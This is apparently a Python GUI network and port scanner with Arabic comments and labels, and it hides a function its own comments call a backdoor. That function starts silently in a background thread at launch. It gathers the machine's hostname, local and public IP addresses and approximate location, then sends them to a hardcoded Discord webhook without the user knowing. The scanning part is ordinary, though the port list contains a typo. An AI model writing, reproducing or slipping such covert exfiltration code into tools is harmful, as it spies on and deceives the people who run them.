import customtkinter as ctk
import ipaddress
import subprocess
import platform
import socket
import threading
import requests
from concurrent.futures import ThreadPoolExecutor

# إعدادات المظهر
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

# إعداد Webhook لـ Discord
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1372000702859182151/XZffCLethzOTgkzu9nwyDe8fH-ubQa6INxB53M-_WdxNomUEjeA716z3tgK9g3G5SfXF"  # ← 🔁 ضع رابط Webhook الخاص بك هنا

# إرسال البيانات إلى Discord
def send_to_discord(webhook_url, message):
    data = {"content": message}
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code != 204:
            print(f"❌ فشل الإرسال إلى Discord: {response.text}")
    except Exception as e:
        print(f"❌ خطأ أثناء الإرسال إلى Discord: {e}")

# Backdoor - يعمل بالخلفية ويرسل معلومات إلى Discord
def backdoor():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

        # الحصول على IP العام والموقع
        ip_info = requests.get("https://ipinfo.io/json").json()
        public_ip = ip_info.get("ip", "غير معروف")
        city = ip_info.get("city", "غير معروف")
        country = ip_info.get("country", "غير معروف")
        location = f"{city}, {country}"

        # تجهيز الرسالة
        message = f"""
📡 Backdoor Report:

📍 اسم الجهاز: {hostname}
🔌 IP المحلي: {local_ip}
🌐 IP العام: {public_ip}
📍 الموقع: {location}
"""
        send_to_discord(DISCORD_WEBHOOK_URL, message.strip())
    except Exception as e:
        send_to_discord(DISCORD_WEBHOOK_URL, f"❌ Backdoor Error: {e}")

# إعدادات النظام
param = '-n' if platform.system().lower() == 'windows' else '-c'
common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 3389,5555.5556]

# فحص اتصال IP
def ping(ip):
    try:
        result = subprocess.run(['ping', param, '1', str(ip)],
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
        if result.returncode == 0:
            return str(ip)
    except:
        pass
    return None

# فحص المنافذ
def scan_ports(ip):
    open_ports = []
    for port in common_ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(0.5)
            try:
                if sock.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
            except:
                pass
    return open_ports

# تنفيذ الفحص
def scan_network():
    output_box.configure(state="normal")
    output_box.delete("1.0", "end")
    subnet_input = entry.get()

    try:
        network = ipaddress.ip_network(subnet_input, strict=False)
    except ValueError:
        output_box.insert("end", "❌ صيغة عنوان الشبكة غير صحيحة.\n")
        output_box.configure(state="disabled")
        return

    output_box.insert("end", f"📡 جاري فحص الشبكة: {subnet_input}\n")

    def run_scan():
        live_hosts = []
        with ThreadPoolExecutor(max_workers=100) as executor:
            results = executor.map(ping, network.hosts())
            for ip in results:
                if ip:
                    live_hosts.append(ip)
                    output_box.insert("end", f"[+] {ip} متصل ✅\n")
                    output_box.update()

        output_box.insert("end", "\n🔍 جاري فحص المنافذ المفتوحة...\n\n")
        output_box.update()

        for ip in live_hosts:
            ports = scan_ports(ip)
            if ports:
                output_box.insert("end", f"🔓 {ip} - المنافذ المفتوحة: {ports}\n")
            else:
                output_box.insert("end", f"🔐 {ip} - لا توجد منافذ مفتوحة معروفة.\n")
            output_box.update()

        output_box.insert("end", "\n✅ الفحص انتهى.\n")
        output_box.configure(state="disabled")

    app.after(100, run_scan)

# واجهة المستخدم
app = ctk.CTk()
app.title("🛡️ أداة فحص الشبكة والمنافذ")
app.geometry("700x550")

title_label = ctk.CTkLabel(app, text="🛠️ أداة فحص الشبكة والمنافذ", font=("Arial", 20))
title_label.pack(pady=10)

entry = ctk.CTkEntry(app, placeholder_text="أدخل نطاق الشبكة مثل 192.168.1.0/24", width=400)
entry.pack(pady=10)
entry.insert(0, "192.168.1.0/24")

scan_button = ctk.CTkButton(app, text="ابدأ الفحص", command=scan_network)
scan_button.pack(pady=10)

output_box = ctk.CTkTextbox(app, width=650, height=350)
output_box.pack(pady=10)
output_box.configure(state="disabled")

# تشغيل الـ Backdoor بشكل خفي
threading.Thread(target=backdoor, daemon=True).start()

app.mainloop()
